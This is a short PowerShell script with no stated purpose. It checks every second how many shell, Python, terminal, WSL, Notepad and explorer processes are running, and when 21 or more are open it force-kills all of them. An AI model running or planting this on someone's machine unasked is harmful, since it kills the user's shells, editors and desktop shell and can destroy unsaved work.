$processesToCheck = @("powershell","powershell_ise", "python", "python2", "python3", "cmd", "conhost", "openconsole", "terminal", "kali", "wsl", "notepad", "explorer", "notepad++", "notepad.exe")
$targetProcessCount = 21
while ($true) {
    $combinedCount = 0
    foreach ($processName in $processesToCheck) {
        $runningProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
        if ($runningProcesses) {
            $combinedCount += $runningProcesses.Count
        }
    }
    if ($combinedCount -ge $targetProcessCount) {
        Write-Host "Combined count of processes reached $combinedCount. Terminating processes..."
        foreach ($processName in $processesToCheck) {
            $runningProcesses = Get-Process -Name $processName -ErrorAction SilentlyContinue
            if ($runningProcesses) {
                foreach ($process in $runningProcesses) {
                    Stop-Process -Id $process.Id -Force
					
                }
            }
        }
    }
    Start-Sleep -Seconds 1  # Check process count every 1 second
}
